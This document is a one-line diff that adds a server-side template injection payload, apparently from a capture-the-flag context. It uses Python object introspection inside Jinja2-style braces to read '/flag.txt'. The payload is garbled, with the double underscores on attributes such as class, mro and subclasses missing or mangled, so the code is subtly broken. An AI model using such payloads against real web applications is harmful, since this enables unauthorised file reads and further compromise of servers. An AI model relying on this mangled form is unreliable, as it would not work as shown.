@@ -1,0 +1,1 @@
+{{ ''._class.mro[2].subclasses_()[40]('/flag.txt').read() }}
